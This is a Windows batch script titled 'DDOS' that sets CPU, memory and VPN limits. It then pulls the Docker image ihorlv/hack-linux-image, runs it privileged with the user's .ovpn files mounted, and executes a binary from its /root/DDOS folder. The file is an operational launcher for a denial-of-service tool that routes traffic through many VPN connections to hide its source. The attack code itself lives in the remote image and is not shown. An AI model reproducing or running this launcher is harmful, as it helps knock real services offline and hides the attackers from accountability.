@echo off
chcp 65001
title DDOS
cls

set /p    cpuCount=How many CPU core(s) to use  (max. limit) ?    Press ENTER for default value (1)  _
if "%cpuCount%" equ "" set "cpuCount=1"

set /p  memorySize=How many GiB of RAM to use   (max. limit) ?    Press ENTER for default value (4)  _
if "%memorySize%" equ "" set "memorySize=4"

set /p vpnQuantity=How many parallel VPN connections to run ?     Press ENTER for auto calculation   _
if "%vpnQuantity%" equ "" set "vpnQuantity=0"

@echo on

docker container stop hack-linux-container
docker rm hack-linux-container

docker pull ihorlv/hack-linux-image:latest
docker create --cpus="%cpuCount%" --memory="%memorySize%g" --memory-swap="20g" --volume "%CD%\put-your-ovpn-files-here":/media/ovpn  --privileged  --interactive  --name hack-linux-container  ihorlv/hack-linux-image
docker container start hack-linux-container

echo cpus=%cpuCount%;memory=%memorySize%;vpnQuantity=%vpnQuantity% > "%CD%\docker.config"
docker cp "%CD%\docker.config" hack-linux-container:/root/DDOS
del "%CD%\docker.config"

docker exec  --interactive  --tty  hack-linux-container  /root/DDOS/hack-linux-runme.elf
echo "Waiting 20 seconds"
timeout 10
docker container stop hack-linux-container
echo "Docker container stopped"